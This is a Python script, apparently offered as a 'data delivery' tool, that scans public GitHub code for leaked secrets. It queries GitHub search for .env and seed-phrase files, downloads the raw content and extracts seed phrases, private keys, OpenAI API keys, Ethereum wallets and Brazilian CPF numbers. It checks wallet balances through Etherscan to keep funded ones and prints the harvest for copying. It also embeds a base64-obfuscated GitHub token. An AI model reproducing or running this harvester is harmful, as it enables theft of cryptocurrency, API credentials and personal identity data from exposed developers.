#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA v15.8: DATA-DELIVERY
Consolidação de dados para exibição direta em ambientes Cloud.
Proprietário: Danilo Gomes
"""
import re, requests, os, base64, json, time
from datetime import datetime
from pathlib import Path

_K = base64.b64decode("Z2hwX0NuZU9qVlJTaDFDb2ZoSXpBVjFxOHJDWEdYY09idzNVZXM1Zw==").decode()
_D = Path(__file__).resolve().parent / "ATENA_DATABASE"

class AtenaSoberana:
    def __init__(self):
        self.h = {'Authorization': f'token {_K}', 'Accept': 'application/vnd.github.v3+json'}
        self.results = [] # Memória temporária para entrega final
        self.p = {
            "SEED": r'\b(?:[a-z]{3,}\s){11,23}[a-z]{3,}\b',
            "WALLET": r'0x[a-fA-F0-9]{40}',
            "PRIVATE_KEY": r'\b[a-fA-F0-9]{64}\b',
            "OPENAI": r'sk-[a-zA-Z0-9]{48}',
            "CPF": r'\b\d{3}\.\d{3}\.\d{3}-\d{2}\b'
        }

    def validar_saldo(self, address):
        try:
            url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest"
            r = requests.get(url, timeout=5).json()
            return int(r.get('result', 0)) > 0
        except: return False

    def arquivar(self, dado, cat, origem):
        status = ""
        # Filtro de Liquidez para não poluir sua entrega
        if cat == "WALLET":
            if not self.validar_saldo(dado): return
            status = "💰 [COM SALDO]"
        
        entry = {"tipo": cat, "valor": dado, "status": status, "fonte": origem}
        if entry not in self.results:
            self.results.append(entry)
            print(f"✅ Capturado: {cat}")

    def iniciar_caçada(self):
        print("🧬 ATENA v15.8: Iniciando extração e consolidação...")
        queries = ["extension:env sk-", "extension:env PRIVATE_KEY", "extension:txt \"seed phrase\""]
        
        for q in queries:
            try:
                r = requests.get(f"https://api.github.com/search/code?q={q}", headers=self.h, timeout=15)
                if r.status_code == 200:
                    for i in r.json().get('items', [])[:5]:
                        raw = i['html_url'].replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                        res = requests.get(raw, headers=self.h, timeout=10)
                        for k, v in self.p.items():
                            matches = re.findall(v, res.text)
                            for m in matches: self.arquivar(m, k, i['html_url'])
            except: pass
        
        # --- O SEGREDO DA ENTREGA ---
        print("\n" + "="*50)
        print("📦 RELATÓRIO FINAL DE EXTRAÇÃO (COPIE ABAIXO)")
        print("="*50)
        if self.results:
            print(json.dumps(self.results, indent=4))
        else:
            print("⚠️ Ciclo concluído, mas nenhum dado novo com valor foi encontrado.")
        print("="*50)
        print("🏁 ATENA encerrando ciclo linear.")

if __name__ == "__main__":
    AtenaSoberana().iniciar_caçada()
    
